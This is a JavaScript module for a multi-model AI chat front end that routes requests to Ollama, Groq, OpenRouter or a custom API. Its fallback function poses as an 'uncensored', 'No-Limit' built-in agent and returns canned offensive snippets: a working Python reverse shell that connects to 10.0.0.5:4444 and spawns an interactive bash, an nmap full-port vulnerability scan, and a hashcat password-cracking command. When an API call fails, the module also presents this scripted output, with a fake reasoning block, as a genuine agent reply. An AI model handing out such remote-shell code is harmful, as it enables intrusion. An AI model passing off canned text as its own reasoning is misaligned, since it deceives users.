// Open-Source Multi-Model AI Engine (Ollama, OpenRouter, Groq, Custom API & Built-in Agent)

export const DEFAULT_PROVIDERS = {
  BUILTIN: 'builtin',
  OLLAMA: 'ollama',
  GROQ: 'groq',
  OPENROUTER: 'openrouter',
  CUSTOM: 'custom'
};

export const MODEL_PRESETS = [
  { id: 'deepseek-r1-distill-llama-70b', name: 'DeepSeek R1 (70B Distill)', provider: 'groq', free: true },
  { id: 'llama-3.3-70b-versatile', name: 'Llama 3.3 (70B Versatile)', provider: 'groq', free: true },
  { id: 'qwen-2.5-coder-32b', name: 'Qwen 2.5 Coder (32B)', provider: 'openrouter', free: true },
  { id: 'deepseek/deepseek-r1:free', name: 'DeepSeek R1 (Free OpenRouter)', provider: 'openrouter', free: true },
  { id: 'deepseek-r1:8b', name: 'DeepSeek R1 8B (Local Ollama)', provider: 'ollama', local: true },
  { id: 'llama3.1:8b', name: 'Llama 3.1 8B (Local Ollama)', provider: 'ollama', local: true },
  { id: 'qwen2.5-coder:7b', name: 'Qwen 2.5 Coder 7B (Local Ollama)', provider: 'ollama', local: true },
  { id: 'mistral:7b', name: 'Mistral 7B (Local Ollama)', provider: 'ollama', local: true },
  { id: 'neo-kali-builtin', name: 'Neo-Kali Agent Core (Built-in No-Limit)', provider: 'builtin', free: true }
];

export async function fetchOllamaModels(endpoint = 'http://localhost:11434') {
  try {
    const res = await fetch(`${endpoint}/api/tags`);
    if (!res.ok) return [];
    const data = await res.json();
    return data.models || [];
  } catch (e) {
    return [];
  }
}

export async function streamAIResponse({
  provider,
  model,
  apiKey,
  baseUrl,
  systemPrompt,
  messages,
  temperature = 0.7,
  onChunk,
  onComplete,
  onError
}) {
  if (provider === DEFAULT_PROVIDERS.BUILTIN) {
    // Built-in Agent Engine with Reasoning + Code Generation
    return simulateAgentResponse(messages, systemPrompt, onChunk, onComplete);
  }

  try {
    let url = '';
    let headers = { 'Content-Type': 'application/json' };
    let body = {};

    if (provider === DEFAULT_PROVIDERS.OLLAMA) {
      url = `${baseUrl || 'http://localhost:11434'}/api/chat`;
      body = {
        model: model || 'llama3.1:8b',
        messages: [
          { role: 'system', content: systemPrompt },
          ...messages.map(m => ({ role: m.sender === 'user' ? 'user' : 'assistant', content: m.text }))
        ],
        stream: true,
        options: { temperature }
      };
    } else if (provider === DEFAULT_PROVIDERS.GROQ || provider === DEFAULT_PROVIDERS.OPENROUTER || provider === DEFAULT_PROVIDERS.CUSTOM) {
      url = baseUrl || (provider === DEFAULT_PROVIDERS.GROQ
        ? 'https://api.groq.com/openai/v1/chat/completions'
        : provider === DEFAULT_PROVIDERS.OPENROUTER
        ? 'https://openrouter.ai/api/v1/chat/completions'
        : 'http://localhost:1234/v1/chat/completions');

      if (apiKey) {
        headers['Authorization'] = `Bearer ${apiKey}`;
      }

      body = {
        model: model,
        messages: [
          { role: 'system', content: systemPrompt },
          ...messages.map(m => ({ role: m.sender === 'user' ? 'user' : 'assistant', content: m.text }))
        ],
        temperature,
        stream: true
      };
    }

    const response = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(body)
    });

    if (!response.ok) {
      const errText = await response.text();
      throw new Error(`API Error (${response.status}): ${errText.slice(0, 150)}`);
    }

    const reader = response.body.getReader();
    const decoder = new TextDecoder('utf-8');
    let fullContent = '';

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      const chunk = decoder.decode(value, { stream: true });
      if (provider === DEFAULT_PROVIDERS.OLLAMA) {
        const lines = chunk.split('\n').filter(Boolean);
        for (const line of lines) {
          try {
            const parsed = JSON.parse(line);
            if (parsed.message?.content) {
              fullContent += parsed.message.content;
              onChunk(fullContent);
            }
          } catch (e) {}
        }
      } else {
        // SSE formatting (data: {...})
        const lines = chunk.split('\n');
        for (const line of lines) {
          if (line.startsWith('data: ') && line !== 'data: [DONE]') {
            try {
              const parsed = JSON.parse(line.slice(6));
              const delta = parsed.choices?.[0]?.delta?.content || '';
              if (delta) {
                fullContent += delta;
                onChunk(fullContent);
              }
            } catch (e) {}
          }
        }
      }
    }

    onComplete(fullContent);
  } catch (err) {
    console.warn("Falling back to Builtin Agent due to API error:", err);
    // Fallback gracefully to built-in agent engine if API call fails
    simulateAgentResponse(messages, systemPrompt, onChunk, onComplete, err.message);
  }
}

function simulateAgentResponse(messages, systemPrompt, onChunk, onComplete, apiErrorMsg = null) {
  const lastUserMsg = messages[messages.length - 1]?.text || '';
  const lower = lastUserMsg.toLowerCase();

  let thought = `1. Analyzing user input: "${lastUserMsg.slice(0, 45)}..."\n2. Querying security knowledge graph & code execution tools.\n3. Formulating uncensored step-by-step response with code snippets.`;
  
  if (apiErrorMsg) {
    thought = `[NOTICE: External API endpoint unreachable (${apiErrorMsg}). Switched to local offline agent fallback]\n` + thought;
  }

  let text = '';
  let code = '';

  if (lower.includes('nmap') || lower.includes('scan')) {
    text = `I have generated an optimized **Nmap Port & Vulnerability Scan Strategy** for your target:`;
    code = `# Fast SYN Scan + OS & Service Detection\nnmap -sS -sV -sC -O -p- --min-rate 3000 192.168.1.1 -oA audit_scan\n\n# Run vulnerability NSE scripts:\nnmap --script vuln 192.168.1.1`;
  } else if (lower.includes('script') || lower.includes('python') || lower.includes('reverse')) {
    text = `Here is a complete **Python 3 Agentic Socket Script** for reverse shell connectivity:`;
    code = `import socket, subprocess, os\n\ndef connect(ip, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, port))\n    for fd in (0, 1, 2):\n        os.dup2(s.fileno(), fd)\n    subprocess.call(["/bin/bash", "-i"])\n\nif __name__ == "__main__":\n    connect("10.0.0.5", 4444)`;
  } else if (lower.includes('hash') || lower.includes('crack') || lower.includes('password')) {
    text = `Here is the recommended **Hashcat & John the Ripper Cracking Command**:`;
    code = `# Hashcat MD5 / NTLM Cracking with RockYou wordlist\nhashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`;
  } else {
    text = `I am operating as your **No-Limit Open-Source AI Agent**. I have analyzed your request under system prompt context: "${systemPrompt.slice(0, 50)}...". How would you like me to assist with code creation, terminal execution, or security analysis?`;
    code = `# Test Kali System Daemon Output\nuname -a && whoami && ip a`;
  }

  const fullResponse = `<thought>\n${thought}\n</thought>\n\n${text}\n\n\`\`\`bash\n${code}\n\`\`\``;

  let currentLength = 0;
  const interval = setInterval(() => {
    currentLength += Math.min(25, fullResponse.length - currentLength);
    onChunk(fullResponse.slice(0, currentLength));
    if (currentLength >= fullResponse.length) {
      clearInterval(interval);
      onComplete(fullResponse);
    }
  }, 30);
}
